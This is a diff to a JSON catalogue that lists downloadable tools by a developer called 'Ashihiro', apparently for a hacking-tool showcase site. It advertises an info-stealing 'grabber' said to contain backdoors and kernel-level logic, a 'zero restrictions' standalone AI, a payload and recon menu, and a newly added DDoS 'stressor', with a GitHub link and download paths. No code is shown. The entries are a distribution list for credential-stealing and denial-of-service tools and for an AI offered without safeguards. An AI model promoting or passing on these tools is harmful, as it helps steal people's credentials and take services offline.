@@ -2,25 +2,32 @@
   {
     "name": "Ashihiro Grabber Github",
     "description": "Shiros new updated logger now contains backdoors and kernel level logic!!!!",
-    "version": "3.0.0",
+    "version": "v3",
     "author": "Ashihiro",
-    "tags": ["Tool", "CLI", "Python"],
+    "tags": ["Tool", "Info-Stealer", "Py"],
     "link": "https://github.com/kfctendzer/New-world-order-"
   },
   {
     "name": "Ashihiro's Standalone AI",
     "description": "Standalone ai Add api key and model Zero restrictions",
-    "version": "1.0.0",
-    "tags": ["Python", "Logger"],
+    "version": "v2",
+    "tags": ["Html", "Ai"],
     "download": "assets/downloads/apex v12.zip"
   },
   {
     "name": "Ashihiro athena menu",
-    "description": "Athena OS menu for advanced recon and advanced payloads!!!!",
-    "version": "2.0.0",
-    "tags": ["Python", "Athena OS"],
+    "description": "Athena OS menu for osint, payloads, recon, etc,",
+    "version": "v2",
+    "tags": ["Py", "Athena OS"],
     "download": "assets/downloads/Ashihiro_athena.txt"
-  }
+  },
+  {
+    "name": "Ashihiro's Basic stressor",
+    "description": "Ashihiro's Basic stressor. Open source free to remodel. More to come.",
+    "version": "v1",
+    "tags": ["Py", "DDos"],
+    "download": "assets/downloads/Ashihiro_athena.txt"
+  },
 ]
 
 
